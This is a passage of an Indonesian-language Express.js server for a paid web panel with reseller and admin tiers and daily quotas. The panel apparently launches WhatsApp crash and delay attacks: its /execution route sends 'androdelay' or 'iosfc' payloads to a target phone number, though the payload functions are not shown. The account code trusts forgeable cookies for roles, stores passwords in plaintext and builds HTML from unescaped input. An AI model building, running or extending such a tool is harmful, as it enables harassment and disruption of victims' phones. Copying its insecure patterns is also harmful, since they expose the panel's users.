    reseller: ["user"]
  };
  const labels = {
    user: "User",
    reseller: "Reseller",
    admin: "Admin"
  };

  const allowedRoles = roleOptions[currentRole] || [];
  const roleSelect = document.getElementById("roleSelect");

  allowedRoles.forEach(role => {
    const opt = document.createElement("option");
    opt.value = role;
    opt.textContent = labels[role];
    roleSelect.appendChild(opt);
  });
</script>

  <script>
    $('#particles').particleground({
      dotColor: '#ffffff',
      lineColor: '#9932cc',
      minSpeedX: 0.1,
      maxSpeedX: 0.3,
      minSpeedY: 0.1,
      maxSpeedY: 0.3,
      density: 10000,
      particleRadius: 3
    });

    const toggleBtn = document.getElementById("toggleFormBtn");
    const form = document.getElementById("userFormContainer");

    toggleBtn.addEventListener("click", () => {
      const isHidden = form.style.display === "none" || form.style.display === "";
      form.style.display = isHidden ? "block" : "none";
      toggleBtn.innerHTML = isHidden
        ? '<i class="fas fa-times"></i> Cancell'
        : '<i class="fas fa-user-plus"></i> Add User';
    });
  </script>
</body>
</html>
  `;
  res.send(html);
});


// Tambahkan di bawah route lain
app.post("/adduser", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUser = req.cookies.sessionUser;
  const { username, password, role, durasi } = req.body;

  // Validasi input
  if (!username || !password || !role || !durasi) {
    return res.send("❌ Lengkapi semua kolom.");
  }

  // Cek hak akses berdasarkan role pembuat
  if (sessionRole === "user") {
    return res.send("🚫 User tidak bisa membuat akun.");
  }

  if (sessionRole === "reseller" && role !== "user") {
    return res.send("🚫 Reseller hanya boleh membuat user biasa.");
  }

  if (sessionRole === "admin" && role === "admin") {
    return res.send("🚫 Admin tidak boleh membuat admin lain.");
  }

  const users = getUsers();

  // Cek username sudah ada
  if (users.some(u => u.username === username)) {
    return res.send("❌ Username sudah terdaftar.");
  }

  const expired = Date.now() + parseInt(durasi) * 86400000;

  users.push({
    username,
    password,
    expired,
    role,
    telegram_id: req.cookies.sessionID,
    isLoggedIn: false
  });

  saveUsers(users);
  res.redirect("/userlist");
});

app.post("/hapususer", (req, res) => {
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;
  const { username } = req.body;

  const users = getUsers();
  const targetUser = users.find(u => u.username === username);

  if (!targetUser) {
    return res.send("❌ User tidak ditemukan.");
  }

  // Tidak bisa hapus diri sendiri
  if (sessionUsername === username) {
    return res.send("❌ Tidak bisa hapus akun sendiri.");
  }

  // Reseller hanya boleh hapus user biasa
  if (sessionRole === "reseller" && targetUser.role !== "user") {
    return res.send("❌ Reseller hanya bisa hapus user biasa.");
  }

  // Admin tidak boleh hapus admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa hapus admin lain.");
  }

  // Admin/reseller tidak boleh hapus owner
  if (targetUser.role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa menghapus owner.");
  }

  // Lanjut hapus
  const filtered = users.filter(u => u.username !== username);
  saveUsers(filtered);
  res.redirect("/userlist");
});


app.get("/edituser", (req, res) => {
  const role = req.cookies.sessionRole;
  const currentUser = req.cookies.sessionUser;
  const username = req.query.username;

  if (!["reseller", "admin", "owner"].includes(role)) {
    return res.send("🚫 Akses ditolak.");
  }

  if (!username) {
    return res.send("❗ Username tidak valid.");
  }

  const users = getUsers();
  const user = users.find(u => u.username === username);

  if (!user) {
    return res.send("❌ User tidak ditemukan.");
  }

  // 🔒 Proteksi akses edit
  if (username === currentUser) {
    return res.send("❌ Tidak bisa edit akun sendiri.");
  }

  if (role === "reseller" && user.role !== "user") {
    return res.send("❌ Reseller hanya boleh edit user biasa.");
  }

  if (role === "admin" && user.role === "admin") {
    return res.send("❌ Admin tidak bisa edit admin lain.");
  }

  // 🔒 Tentukan opsi role yang boleh diedit
  let roleOptions = "";
  if (role === "owner") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
      <option value="admin" ${user.role === "admin" ? 'selected' : ''}>Admin</option>
      <option value="owner" ${user.role === "owner" ? 'selected' : ''}>Owner</option>
    `;
  } else if (role === "admin") {
    roleOptions = `
      <option value="user" ${user.role === "user" ? 'selected' : ''}>User</option>
      <option value="reseller" ${user.role === "reseller" ? 'selected' : ''}>Reseller</option>
    `;
  } else {
    // Reseller tidak bisa edit role
    roleOptions = `<option value="${user.role}" selected hidden>${user.role}</option>`;
  }

  const now = Date.now();
  const sisaHari = Math.max(0, Math.ceil((user.expired - now) / 86400000));
  const expiredText = new Date(user.expired).toLocaleString("id-ID", {
    year: "numeric", month: "2-digit", day: "2-digit",
    hour: "2-digit", minute: "2-digit"
  });

  const html = `
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Edit User</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600&family=Poppins:wght@400;600&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
  <script src="https://cdn.jsdelivr.net/gh/jnicol/particleground/jquery.particleground.min.js"></script>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
  font-family: 'Poppins', sans-serif;
  background: #000000;
  color: #423EC8;
  min-height: 100vh;
  padding: 20px;
  position: relative;
  overflow-y: auto; 
  overflow-x: hidden;
}

    #particles {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      bottom: 0;
      z-index: 0;
    }

    .content {
      position: relative;
      z-index: 2;
    }

    h2 {
      text-align: center;
      margin-bottom: 20px;
      color: #402BE2;
      font-family: 'Poppins', sans-serif;
      text-shadow: 0 0 8px rgba(43, 81, 226, 0.7);
    }

    .form-container {
      max-width: 480px;
      margin: 0 auto;
      background: rgba(0, 0, 0, 0.7);
      border: 1px solid #522BE2;
      padding: 24px;
      border-radius: 16px;
      box-shadow: 0 0 20px rgba(46, 43, 226, 0.5);
      backdrop-filter: blur(8px);
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-weight: 600;
      color: #26359B;
      font-family: 'Poppins', sans-serif;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin-bottom: 18px;
      border-radius: 10px;
      border: none;
      background: #1a001a;
      color:#4533D0 #4F2DCA;
      box-sizing: border-box;
    }

    .expired-info {
      margin-top: -12px;
      margin-bottom: 18px;
      font-size: 12px;
      color: #aaa;
      padding: 12px;
      background: #1a001a;
      border-radius: 10px;
      width: 100%;
      box-sizing: border-box;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #472BE2;
      color: white;
      border: none;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
      box-sizing: border-box;
      margin-top: 10px;
      font-family: 'Poppins', sans-serif;
    }

    button:hover {
      background: #4032CC;
      transform: scale(1.02);
    }

    .back-btn {
  display: block;
  width: 100%;
  padding: 14px;
  margin: 16px auto;
  background: #040082;
  color: white;
  text-align: center;
  border-radius: 10px;
  text-decoration: none;
  font-size: 15px;
  font-weight: bold;
  font-family: 'Poppins', sans-serif;
  border: none;
  cursor: pointer;
  transition: 0.3s;
  box-sizing: border-box;
}

    .back-btn:hover {
  background: #2a004a;
  transform: scale(1.02);
}

    @media (max-width: 500px) {
      body {
        padding: 16px;
      }

      .form-container {
        padding: 16px;
      }

      input, select {
        padding: 10px;
      }

      button {
        padding: 12px;
      }
    }
  </style>
</head>
<body>
  <!-- Efek Partikel -->
  <div id="particles"></div>

  <div class="content">
    <h2>Edit User: ${user.username}</h2>

    <div class="form-container">
      <form method="POST" action="/edituser">
        <input type="hidden" name="oldusername" value="${user.username}">

        <label>Username</label>
        <input type="text" name="username" value="${user.username}" required>

        <label>Password</label>
        <input type="text" name="password" value="${user.password}" required>

        <label>Expired</label>
        <input type="text" value="${expiredText} - Remaining time: ${sisaHari} more days" disabled class="expired-info">

        <label>Extend</label>
        <input type="number" name="extend" min="0" placeholder="Duration (days)">

        <label>Role</label>
        <select name="role">
          ${roleOptions}
        </select>

        <button type="submit"><i class="fas fa-save"></i> Save Changes</button>
      </form>
    </div>

    <a href="/userlist" class="back-btn" style="display:block; max-width:480px; margin:20px auto;"><i class="fas fa-arrow-left"></i> Back to User List</a>
  </div>

  <!-- JS Partikel -->
  <script>
    $(document).ready(function() {
      $('#particles').particleground({
        dotColor: '#ffffff',
        lineColor: '#8a2be2',
        minSpeedX: 0.1,
        maxSpeedX: 0.3,
        minSpeedY: 0.1,
        maxSpeedY: 0.3,
        density: 10000,
        particleRadius: 3,
      });
    });
  </script>
</body>
</html>
`;

  res.send(html);
});


app.post("/edituser", (req, res) => {
  const { oldusername, username, password, extend, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldusername);
  if (index === -1) return res.send("❌ User tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh edit akun sendiri
  if (sessionUsername === oldusername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user dan tidak bisa ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya boleh edit user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak bisa edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit admin lain.");
  }

  // ❌ Admin tidak bisa set role jadi admin (buat yang lain)
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Perpanjang expired
  const now = Date.now();
  const current = targetUser.expired > now ? targetUser.expired : now;
  const tambahan = parseInt(extend || "0") * 86400000;

  users[index] = {
    ...targetUser,
    username,
    password,
    expired: current + tambahan,
    role
  };

  saveUsers(users);
  res.redirect("/userlist");
});


app.post("/updateuser", (req, res) => {
  const { oldUsername, username, password, expired, role } = req.body;
  const sessionRole = req.cookies.sessionRole;
  const sessionUsername = req.cookies.sessionUser;

  if (!["reseller", "admin", "owner"].includes(sessionRole)) {
    return res.send("❌ Akses ditolak.");
  }

  const users = getUsers();
  const index = users.findIndex(u => u.username === oldUsername);
  if (index === -1) return res.send("❌ Username tidak ditemukan.");

  const targetUser = users[index];

  // ❌ Tidak boleh update akun sendiri
  if (sessionUsername === oldUsername) {
    return res.send("❌ Tidak bisa mengedit akun sendiri.");
  }

  // ❌ Reseller hanya bisa edit user, dan tidak boleh ubah role
  if (sessionRole === "reseller") {
    if (targetUser.role !== "user") {
      return res.send("❌ Reseller hanya bisa mengubah user biasa.");
    }
    if (role !== targetUser.role) {
      return res.send("❌ Reseller tidak bisa mengubah role user.");
    }
  }

  // ❌ Admin tidak boleh edit admin lain
  if (sessionRole === "admin" && targetUser.role === "admin") {
    return res.send("❌ Admin tidak bisa mengedit sesama admin.");
  }

  // ❌ Admin tidak boleh ubah role ke admin
  if (sessionRole === "admin" && role === "admin") {
    return res.send("❌ Admin tidak bisa mengubah role menjadi admin.");
  }

  // ❌ Hanya owner bisa set ke role owner
  if (role === "owner" && sessionRole !== "owner") {
    return res.send("❌ Hanya owner yang bisa mengubah ke role owner.");
  }

  // ✅ Update username & password
  targetUser.username = username;
  targetUser.password = password;

  // ✅ Update expired
  const days = parseInt(expired);
  if (!isNaN(days) && days > 0) {
    const now = Date.now();
    const currentExp = targetUser.expired;
    targetUser.expired = currentExp > now
      ? currentExp + days * 86400000
      : now + days * 86400000;
  }

  // ✅ Ubah role jika owner, atau admin (dengan batasan)
  if (sessionRole === "owner") {
    targetUser.role = role;
  } else if (sessionRole === "admin" && (role === "user" || role === "reseller")) {
    targetUser.role = role;
  }

  saveUsers(users);
  res.redirect("/userlist");
});


app.get("/execution", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/login");

  const users = getUsers();
  const currentUser = users.find(u => u.username === username);
  if (!currentUser || !currentUser.expired || Date.now() > currentUser.expired) {
    return res.redirect("/login");
  }

  const targetNumber = req.query.target;
  const mode = req.query.mode;
  const target = `${targetNumber}@s.whatsapp.net`;
  const usageData = getUsageLimit();
  const today = new Date().toISOString().split("T")[0];
  const uname = currentUser.username;
  const role = currentUser.role;

  if (!usageData[uname]) usageData[uname] = {};
  if (!usageData[uname][today]) usageData[uname][today] = 0;

  const limitPerRole = {
    user: 10,
    reseller: 25
  };

  if (limitPerRole[role] !== undefined) {
    const usedToday = usageData[uname][today];
    const limitToday = limitPerRole[role];

    if (usedToday >= limitToday) {
      console.log(`[LIMIT] ${uname} used ${usageData[uname][today]} / ${limitPerRole[role]}`);
      return res.send(executionPage("LIMIT TOAST", {
        message: `❌ Kamu sudah mencapai batas ${limitToday}x hari ini. Coba lagi besok.`,
        toastOnly: true
      }, false, currentUser, "", mode));
    }

    // Tambah counter kalau belum limit
    usageData[uname][today]++;
    saveUsageLimit(usageData);
  }

  if (sessions.size === 0) {
    return res.send(executionPage("🚧 MAINTENANCE SERVER !!", {
      message: "Tunggu sampai maintenance selesai..."
    }, false, currentUser, "", mode));
  }

  if (!targetNumber) {
    if (!mode) {
      return res.send(executionPage("✅ Server ON", {
        message: "Pilih mode yang ingin digunakan."
      }, true, currentUser, "", ""));
    }

    if (["androdelay", "androdelay2", "iosfc"].includes(mode)) {
      return res.send(executionPage("✅ Server ON", {
        message: "Masukkan nomor target (62xxxxxxxxxx)."
      }, true, currentUser, "", mode));
    }

    return res.send(executionPage("❌ Mode salah", {
      message: "Mode tidak dikenali. Gunakan ?mode=androdelay atau ?mode=iosfc atau ?mode=androdelay2."
    }, false, currentUser, "", ""));
  }

  if (!/^\d+$/.test(targetNumber)) {
    return res.send(executionPage("❌ Format salah", {
      target: targetNumber,
      message: "Nomor harus hanya angka dan diawali dengan nomor negara"
    }, true, currentUser, "", mode));
  }

  try {
    if (mode === "androdelay") {
      DelayAndro(24, target);
    } else if (mode === "iosfc") {
      FcIos(24, target);
    } else if (mode === "androdelay2") {
      DelayAndro2(24, target);
    } else {
      throw new Error("Mode tidak dikenal.");
    }

    return res.send(executionPage("✅ S U C C E S", {
      target: targetNumber,
      timestamp: new Date().toLocaleString("id-ID"),
      message: `𝐄𝐱𝐞𝐜𝐮𝐭𝐞 𝐌𝐨𝐝𝐞: ${mode.toUpperCase()}`,
      cleanURL: true  // Parameter baru untuk memberi tahu client membersihkan URL
    }, false, currentUser, "", mode, true));
  } catch (err) {
    return res.send(executionPage("❌ Gagal kirim", {
      target: targetNumber,
      message: err.message || "Terjadi kesalahan saat pengiriman."
    }, false, currentUser, "Gagal mengeksekusi nomor target.", mode));
  }
});

app.get("/logout", (req, res) => {
  const username = req.cookies.sessionUser;
  if (!username) return res.redirect("/");

  const users = getUsers();
  const user = users.find(u => u.username === username);
  if (user && user.isLoggedIn) {
  user.isLoggedIn = false;
    console.log(`[ ${chalk.red('LogOut')} ] -> ${user.username}`);
    saveUsers(users);
  }

  // 🔥 Clear semua cookies biar gak nyangkut
  res.clearCookie("sessionUser");
  res.clearCookie("sessionRole");
  res.clearCookie("isLoggedIn", "true"); // <== ini yang kurang
  res.redirect("/");
});

app.listen(PORT, () => {
  console.log(`${chalk.green('Server Active On Port')} ${PORT}`);
});